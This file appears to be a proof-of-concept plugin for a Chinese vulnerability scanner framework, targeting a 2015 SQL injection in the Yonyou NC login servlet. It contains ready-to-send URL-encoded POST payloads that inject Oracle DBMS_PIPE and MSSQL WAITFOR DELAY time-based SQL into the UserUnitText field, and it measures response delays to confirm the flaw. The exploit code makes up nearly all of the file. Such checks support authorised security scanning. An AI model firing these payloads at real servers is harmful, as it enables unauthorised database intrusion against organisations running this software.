# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0034'  # 平台漏洞编号，留空
    name = '用友NC SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-06'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友NC /nc/servlet/nc.ui.iufo.login.LoginUI 参数过滤不完整，SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0138680'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8e6389b7-ae33-4133-bb05-ce3b9359dad0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0138680
            hh = hackhttp.hackhttp()
            url = self.target + '/nc/servlet/nc.ui.iufo.login.LoginUI'
            postdatas = {
                'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C5%29%20AND%20%28%271%27%3D%271': 'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%20AND%208148%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2867%29%7C%7CCHR%2885%29%7C%7CCHR%2876%29%2C1%29%20AND%20%28%271%27%3D%271',
                'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--': 'LoginButton=%e7%99%bb%e5%bd%95(Login)&currentDate=2015-09-02&dschoice=aorwpw5ufcw6&hidBack=&languagechoice=simpchn&operType=null&refrence=%e5%8f%82%e7%85%a7(Ref)&timeRef=%e5%8f%82%e7%85%a7(Ref)&UserCodeText=wxbsisqq&UserPassText=wxbsisqq&UserSeleLang=simpchn&UserUnitText=asd%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A1%27--'
            }
            for postdata in postdatas:
                t1 = time.time()
                code1, head, res1, errcode, _ = hh.http(url, postdata)
                t2 = time.time()
                code2, head, res2, errcode, _ = hh.http(
                    url, postdatas[postdata])
                t3 = time.time()
                if code1 == 200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
                    #security_hole(url + "   :post Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
